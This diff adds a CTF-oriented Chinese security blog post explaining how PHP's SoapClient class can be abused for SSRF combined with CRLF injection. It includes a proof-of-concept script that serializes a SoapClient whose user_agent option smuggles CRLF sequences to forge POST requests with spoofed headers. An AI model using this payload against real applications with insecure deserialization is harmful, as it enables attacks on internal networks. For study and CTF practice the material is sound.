@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="Lethe&#39;s Blog">
+    <meta name="author" content="Lethe">
+    <meta name="keywords" content="Lethe&#39;s Blog">
+    <title>利用SoapClient类进行SSRF+CRLF攻击 ~ Lethe | 忘川</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 80vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>Lethe | 忘川</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/img/2.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">利用SoapClient类进行SSRF+CRLF攻击</p>
+            <br>
+            
+            <p>Friday, September 6th 2019, 12:50 am</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <p>前一段时间在De1CTF中的ShellShellShell以及SUCTF的Upload labs2都涉及到了利用PHP的SoapClient类进行SSRF，因此在这里记录下。</p>
+<p><br></p>
+<h1 id="0x01-什么是Soap"><a href="#0x01-什么是Soap" class="headerlink" title="0x01 什么是Soap"></a>0x01 什么是Soap</h1><p>SOAP是webService三要素（SOAP、WSDL、UDDI）之一：</p>
+<ul>
+<li><p>WSDL 用来描述如何访问具体的接口。</p>
+</li>
+<li><p>UDDI用来管理，分发，查询webService。</p>
+</li>
+<li><p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
+</li>
+</ul>
+<p><br></p>
+<h1 id="0x02-PHP中的SoapClient类"><a href="#0x02-PHP中的SoapClient类" class="headerlink" title="0x02 PHP中的SoapClient类"></a>0x02 PHP中的SoapClient类</h1><p>参考链接：<a href="https://www.php.net/manual/zh/soapclient.soapclient.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/soapclient.soapclient.php</a></p>
+<p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。</p>
+<p>该类的构造函数如下：</p>
+<pre><code class="php">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
+</code></pre>
+<p>第一个参数是用来指明是否是wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<p><img src="/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/20190906000607209.png" alt="在这里插入图片描述"></p>
+<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。</p>
+<p>我们可以设置第一个参数为<code>null</code>，然后第二个参数的<code>location</code>选项设置为<code>target_url</code>，如下</p>
+<pre><code class="php">&lt;?php
+$a = new SoapClient(null, array(&#39;location&#39; =&gt; &quot;http://xxx.xxx.xxx&quot;,
+                                     &#39;uri&#39;      =&gt; &quot;123&quot;));
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的<code>__Call</code>方法，然后向<code>target_url</code>发送一个soap请求，并且<code>uri</code>选项是我们可控的地方。</p>
+<p><br></p>
+<h1 id="0x03-CRLF-Injection"><a href="#0x03-CRLF-Injection" class="headerlink" title="0x03 CRLF Injection"></a>0x03 CRLF Injection</h1><p>CRLF是”回车 + 换行”<code>(\r\n)</code>的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
+<p>参考链接：<br><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">CRLF Injection漏洞的利用与实例分析</a></p>
+<p><br></p>
+<h1 id="0x04-SSRF-CRLF攻击内网"><a href="#0x04-SSRF-CRLF攻击内网" class="headerlink" title="0x04 SSRF+CRLF攻击内网"></a>0x04 SSRF+CRLF攻击内网</h1><p>实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。</p>
+<p>那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：</p>
+<p><img src="/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/20190906003122388.png" alt="在这里插入图片描述"></p>
+<p>可以看到options参数中还有一个选项为<code>user_agent</code>，运行我们自己设置<code>User-Agent</code>的值。</p>
+<p>当我们可以控制<code>User-Agent</code>的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>为和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用CRLF发送post请求最关键的地方。</p>
+<p>最后给出wupco师傅的生成任意POST报文的POC:</p>
+<pre><code class="php">&lt;?php
+$target = &#39;http://123.206.216.198/bbb.php&#39;;
+$post_string = &#39;a=b&amp;flag=aaa&#39;;
+$headers = array(
+    &#39;X-Forwarded-For: 127.0.0.1&#39;,
+    &#39;Cookie: xxxx=1234&#39;
+    );
+$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));
+
+$aaa = serialize($b);
+$aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);
+$aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);
+echo $aaa;
+?&gt;
+</code></pre>
+<p><br></p>
+<p><br></p>
+<p>参考链接：</p>
+<p><a href="https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89" target="_blank" rel="noopener">https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89</a></p>
+<p><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a></p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;CTF</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+                    <p class="note note-warning">原创文章，转载请注明出处！</p>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+
+    
+    <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://lethe.site/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/'; 
+            this.page.identifier = '/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
